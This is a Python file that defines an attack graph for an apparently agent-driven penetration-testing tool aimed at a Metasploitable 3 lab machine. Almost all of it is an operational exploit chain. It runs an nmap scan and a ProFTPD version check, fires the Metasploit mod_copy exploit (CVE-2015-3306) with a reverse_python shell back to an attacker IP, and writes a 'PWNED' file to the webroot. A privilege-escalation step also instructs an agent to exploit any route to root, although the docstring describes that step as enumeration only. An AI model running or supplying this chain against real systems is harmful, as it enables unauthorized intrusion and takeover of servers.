"""
Example Attack Graph: ProFTPD mod_copy RCE (Metasploitable 3)

Unauthenticated service-level exploit chain against MS3's ProFTPD 1.3.5
on port 21. CVE-2015-3306 (mod_copy) lets an unauthenticated attacker
write files anywhere the FTP user can write -- including the webroot --
which Metasploit weaponizes into a one-shot RCE through the local
webserver.

Chain:
  recon            — nmap full scan
  proftpd_check    — auxiliary/scanner/ftp/ftp_version to confirm 1.3.5
  proftpd_rce      — exploit/unix/ftp/proftpd_modcopy_exec -> www-data shell
  escalate   — id / sudo -l / find SUID enumeration on the new shell
  file_drop        — write proof-of-compromise file (likely as www-data)

Expected: clean run lands a low-privilege shell as www-data. escalate
should report no easy root path (no NOPASSWD sudo for www-data), which is
the correct "honest" signal -- the replanner can decide whether to escalate
or wrap up with file_drop in a www-writable directory.
"""

from core_agents.attack_graph import (
    AttackGraph, AttackNode, AttackEdge, EdgeCheck,
    EdgeCondition, Tactic,
)


def build_proftpd_modcopy_graph(target_ip: str, attacker_ip: str) -> AttackGraph:

    graph = AttackGraph.create(
        objective="Compromise the Metasploitable 3 target via the ProFTPD 1.3.5 "
                  "mod_copy vulnerability (CVE-2015-3306) on port 21. Land a "
                  "command shell, enumerate privileges from the shell, and drop "
                  "a proof-of-compromise file in a web-writable directory.",
        target_ip=target_ip,
        name=f"proftpd_modcopy_{target_ip}",
        attacker_ip=attacker_ip,
        scope=[target_ip],
        description="ProFTPD mod_copy unauth RCE baseline against MS3.",
        metadata={"scenario": "proftpd_modcopy_rce", "target_type": "metasploitable3"},
    )

    # =========================================================================
    # NODES
    # =========================================================================

    graph.add_node(AttackNode(
        id="recon",
        label="Nmap Full Scan",
        tactic=Tactic.RECONNAISSANCE.value,
        technique_id="T1046",
        technique_name="Network Service Discovery",
        agent_type="recon",
        goal="Map the target's attack surface and confirm ProFTPD on 21",
        objective=f"Full port scan with service versioning on {target_ip}.",
        target_ip=target_ip,
        tool_name="nmap",
        commands_to_run=[f"nmap -sV -p 0-65535 {target_ip}"],
        tags=["nmap", "full_scan"],
    ))

    graph.add_node(AttackNode(
        id="proftpd_check",
        label="ProFTPD Version Banner Grab",
        tactic=Tactic.DISCOVERY.value,
        technique_id="T1592.002",
        technique_name="Gather Victim Host Info: Software",
        agent_type="recon",
        goal="Confirm ProFTPD version is in the vulnerable 1.3.5 range",
        objective=f"Grab the FTP banner from {target_ip}:21 to verify 1.3.5.",
        target_ip=target_ip,
        tool_name="metasploit",
        module="auxiliary/scanner/ftp/ftp_version",
        module_options={
            "RHOSTS": target_ip,
            "RPORT": 21,
        },
        max_retries=1,
        tags=["ftp", "banner", "version_check"],
    ))

    graph.add_node(AttackNode(
        id="proftpd_rce",
        label="ProFTPD mod_copy RCE",
        tactic=Tactic.INITIAL_ACCESS.value,
        technique_id="T1190",
        technique_name="Exploit Public-Facing Application",
        agent_type="exploit",
        goal="Obtain a command shell via ProFTPD mod_copy",
        objective=f"Run exploit/unix/ftp/proftpd_modcopy_exec against "
                  f"{target_ip}:21 using the local Apache webroot as the "
                  f"SITEPATH; payload cmd/unix/reverse_python.",
        target_ip=target_ip,
        tool_name="metasploit",
        module="exploit/unix/ftp/proftpd_modcopy_exec",
        module_options={
            "RHOSTS": target_ip,
            "RPORT": 80,           # HTTP port -- mod_copy writes via FTP, triggers via HTTP
            "SITEPATH": "/var/www/html",
            "TARGETURI": "/",
        },
        module_options_alternatives={
            "SITEPATH": ["/var/www", "/var/tmp", "/tmp"],
            "TARGETURI": ["/uploads", "/wordpress", "/drupal"],
        },
        payload="cmd/unix/reverse_python",
        payload_options={
            "LHOST": attacker_ip,
            "LPORT": 4445,
        },
        max_retries=3,
        tags=["proftpd", "modcopy", "rce", "unauth"],
    ))

    graph.add_node(AttackNode(
        id="escalate",
        label="Escalate Privileges to Root",
        tactic=Tactic.PRIVILEGE_ESCALATION.value,
        technique_id="T1068",
        technique_name="Exploitation for Privilege Escalation",
        agent_type="privesc",
        goal="Escalate the compromised session to root",
        objective="From the existing session, enumerate AND exploit any viable "
                  "privilege-escalation vector (sudo, SUID, kernel exploit, cron, "
                  "capabilities, writable config, docker group) to obtain a root "
                  "shell. Verify success with id/whoami showing uid=0.",
        target_ip=target_ip,
        max_retries=3,
        tags=["privesc", "escalation", "goal_only"],
    ))

    graph.add_node(AttackNode(
        id="file_drop",
        label="Drop Proof-of-Compromise File",
        tactic=Tactic.IMPACT.value,
        technique_id="T1485",
        technique_name="Data Destruction",
        agent_type="impact",
        goal="Demonstrate compromise with a written artifact in a web-writable path",
        objective="Write a proof-of-compromise file via the www-data session.",
        target_ip=target_ip,
        tool_name="session",
        commands_to_run=[
            "echo '{marker}' > {target_file}",
            "echo \"Compromised at $(date)\" >> {target_file}",
            "echo \"User: $(whoami)\" >> {target_file}",
            "cat {target_file}",
        ],
        command_params={
            "target_file": "/var/www/html/pwned_proftpd.txt",
            "marker": "PWNED via ProFTPD mod_copy",
        },
        command_params_alternatives={
            "target_file": ["/tmp/pwned_proftpd.txt", "/var/tmp/pwned_proftpd.txt"],
        },
        max_retries=3,
        metadata={"target_file": "/var/www/html/pwned_proftpd.txt"},
        tags=["impact", "file_drop", "proof"],
    ))

    # =========================================================================
    # EDGES
    # =========================================================================

    graph.connect(
        "recon", "proftpd_check",
        checks=[
            EdgeCheck(
                field="ports", operator="any_port",
                expected={"port": 21},
                description="FTP service is open on 21",
            ),
        ],
        evidence="Nmap found FTP on port 21",
        rationale="Confirm ProFTPD version before firing the exploit",
    )

    graph.connect(
        "proftpd_check", "proftpd_rce",
        checks=[
            EdgeCheck(
                field="success", operator="equals", expected="True",
                description="ProFTPD banner read",
            ),
        ],
        evidence="ProFTPD 1.3.5 confirmed in banner",
        rationale="Vulnerable version -- exploit mod_copy",
    )

    graph.connect(
        "proftpd_rce", "escalate",
        checks=[
            EdgeCheck(
                field="session_id", operator="exists",
                description="Command shell session opened",
            ),
        ],
        evidence="Got command shell via ProFTPD mod_copy",
        rationale="Enumerate privesc paths from the new (likely www-data) shell",
    )

    graph.connect(
        "escalate", "file_drop",
        checks=[
            EdgeCheck(
                field="success", operator="equals", expected="True",
                description="Session is usable",
            ),
        ],
        evidence="Session privileges enumerated",
        rationale="Drop the proof-of-compromise file as the impact step",
    )

    return graph


# =============================================================================
# CLI
# =============================================================================

if __name__ == "__main__":
    graph = build_proftpd_modcopy_graph(
        target_ip="192.168.34.7",
        attacker_ip="192.168.34.6",
    )
    print(graph.summary())
    print()

    out_path = "examples/proftpd_modcopy_graph.json"
    graph.save(out_path)
    print(f"Saved to {out_path}")

    loaded = AttackGraph.load(out_path)
    print(f"\nReloaded: {loaded}")
    print(f"Ready nodes: {loaded.ready_nodes()}")
